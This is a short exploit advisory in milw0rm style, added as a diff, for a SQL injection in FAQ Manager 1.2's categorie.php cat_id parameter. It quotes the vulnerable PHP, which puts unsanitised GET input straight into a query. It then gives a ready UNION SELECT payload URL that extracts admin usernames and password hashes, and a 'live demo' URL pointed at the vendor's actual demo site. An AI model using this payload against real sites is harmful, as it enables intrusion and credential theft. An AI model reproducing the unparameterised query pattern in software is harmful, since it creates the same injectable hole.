@@ -1,0 +1,47 @@
++---------------------------------------------------------------------------------------+
+|                                                                                       |
+|       FAQ Manager 1.2 (categorie.php cat_id) Remote SQL Injection Vulnerability       |
+|       Bug found by cOndemned                                                          |
+|                                                                                       |
+|       Script site  : http://www.4yoursite.nl/script_faq_manager.php                   |
+|                                                                                       |
+|       Greetz: ZaBeaTy, str0ke, doctor, Necro, 0in, TBH, Av...                         |
+|                                                                                       |
++---------------------------------------------------------------------------------------+
+
+
+# source of categorie.php
+
+	[ ... ] 
+	
+	21.	$catid = $_GET['cat_id'];
+	
+	[ ... ]
+	
+	72.	$faq_query = mysql_query("SELECT * FROM `".$prefix."_faq` WHERE `faq_cat_id` = $catid");
+
+	73.	while($faq = mysql_fetch_assoc($faq_query))
+
+	74.	{
+
+	75.		$faq_cat_id = ($faq['faq_cat_id']);
+
+	76.	}
+
+	77.
+
+	78.	$result = mysql_query("SELECT * FROM `".$prefix."_faq` WHERE `faq_cat_id` = $catid");
+	
+	[ ... ] 
+
+
+# proof of concept
+
+	http://[host]/[faq_manager_path]/catagorie.php?cat_id=3+union+select+1,2,concat_ws(0x3a,admin_name,admin_pass),4,5+from+faq_admin/*
+
+
+# live demo 
+	
+	http://www.4yoursite.nl/demo/faq_manager/catagorie.php?cat_id=3+union+select+1,2,concat_ws(0x3a,admin_name,admin_pass),4,5+from+faq_admin/*
+
+# milw0rm.com [2008-11-25]
